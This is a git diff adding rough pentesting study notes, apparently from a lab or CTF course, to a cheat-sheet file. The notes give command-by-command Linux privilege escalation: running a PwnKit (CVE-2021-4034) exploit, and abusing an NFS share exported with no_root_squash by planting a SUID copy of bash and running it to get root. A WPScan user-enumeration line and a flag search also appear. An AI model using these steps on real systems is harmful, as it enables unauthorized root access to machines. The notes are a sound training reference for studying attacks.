@@ -39,6 +39,62 @@ https://github.com/rebootuser/LinEnum
 LinPEAS
 https://github.com/peass-ng/PEASS-ng
 
+login with RDP
+terminal
+mkdir /tmp/pwnkit
+mv CVE-2021-4034 /tmp/pwnkit/
+cd /tmp
+cd pwnkit
+cd CVE-2021-4034/
+make
+./CVE-2021-4034
+
+Priviledge Escalation Misconfigured nfs shares Victim machine log in to target or ssh into it
+
+Sudo apt-get update
+Sudo apt install nfs-kernel-server
+sudo nano etc/exports
+This is what you add the entry inside the exports file: /home *(rw,no_root_squash)
+
+sudo /etc/init.d/nfs-kernel-server restart (you have to restart the server)
+Attacker machine You should see port 2049 open after scanning
+sudo nmap -sV [IP]
+Do this manually nfs enumerate
+ apt-get install nfs-common
+showmount -e [IP Addrr]) or sudo nmap -sV --script=nfs-showmount [victim IP]
+mkdir /tmp/nfs
+sudo mount -t nfs [IP]:/home /tmp/nfs
+cd /tmp/nfs
+sudo cp /bin/bash .
+sudo chmod +s bash
+ls -la bash (you can see all the privileges)
+ttacker@parrot:~#ssh ubuntu@[IP] (now we can ssh into our target machine)
+cd /home
+ls -la
+./bash -p
+id
+whoami
+
+Priviledge Escalation 2 Exploiting misconfigured NFS (port 2049)
+
+nmap -sV —p 2049 IP/Subnet
+sudo apt-get install nfs-common
+nmap -sV —script=nfs-showmount <Target_IP>
+check available mounts: showmount -e <Target_IP> -> we will see /home directory
+mkdir /tmp/nfs
+sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
+cd /tmp/nfs
+sudo cp /bin/bash .
+sudo chmod +s bash -> it will be highlighted in red
+ls -la
+sudo df -h
+sudo chmod +s bash after them, In another terminal:
+Access to target using SSH
+./bash -p and we're root!
+cd /home
+ls -la
+Find the flag: find / -name "*.txt" -ls 2> /dev/null
+
 WPScan
 wpscan -h
 wpscan --url http://10.10.14.187/ --enumerate u
